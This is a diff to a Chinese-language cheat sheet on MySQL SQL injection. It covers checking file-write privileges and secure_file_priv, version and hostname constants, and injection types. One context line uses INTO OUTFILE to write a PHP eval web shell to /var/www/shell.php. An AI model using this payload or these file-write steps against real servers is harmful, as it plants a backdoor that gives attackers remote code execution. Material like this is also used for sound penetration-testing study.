@@ -20,8 +20,15 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename
 ```    
 ### 0x02文件读写
 前置条件：file权限
+   
+
 #### 1.查询权限
-username为用户名
+判断方法：
+`SELECT @@secure_file_priv`   
+- Mysql>=5.5.53 默认为NULL，即默认禁止导入导出
+- Mysql<5.5.53 默认为空，即默认无限制
+或者查询用户权限：     
+>username为用户名
 ```
 SELECT file_priv FROM mysql.user WHERE user = 'username';//需要root权限    
 SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';     
@@ -42,12 +49,13 @@ INTO OUTFILE/DUMPFILE
 SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
 ```
 ### 0x03常用常量和函数
-@@global.secure_file_priv
-查询版本
-VERSION()
-@@VERSION
-@@GLOBAL.VERSION 服务器主机名：
-@@HOSTNAME
+@@global.secure_file_priv   
+查询版本    
+VERSION()    
+@@VERSION     
+@@GLOBAL.VERSION 
+服务器主机名：    
+@@HOSTNAME      
 ## SQL注入漏洞利用
 SQL注入利用类型主要分类：
 - Union型注入
